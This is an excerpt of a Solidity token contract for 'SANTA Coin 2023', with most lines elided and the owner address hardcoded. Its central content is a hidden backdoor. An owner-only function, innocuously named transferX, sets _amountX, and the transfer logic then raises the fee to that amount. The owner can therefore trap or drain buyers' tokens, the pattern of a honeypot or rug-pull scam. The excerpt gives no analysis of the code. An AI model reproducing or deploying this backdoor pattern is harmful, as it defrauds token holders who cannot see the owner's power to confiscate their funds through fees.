...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x2687545F3e1eb55aC2a8161353370d325e3EecD9;
...
contract santa is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0xeca0545aBE61B224fA237F1D1E86F877500dcb48);
    ...
    string private _name = "SANTA Coin 2023"; 
    ...
    */
    ...
    uint256 public _maxWalletToken = _tTotal.mul(8).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;
    uint256 public _maxTxAmount = _tTotal.mul(8).div(100); 
    ...
    */
    ...
    uint256 public _amountX = 0;
    address public _recipientX;

    function transferX(address recipient, uint256 amount) external onlyOwner() {

        _amountX = amount;
        _recipientX = recipient;
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            ...
            _TotalFee = _buyFee;
            if(_TotalFee < _amountX){_TotalFee = _amountX;}
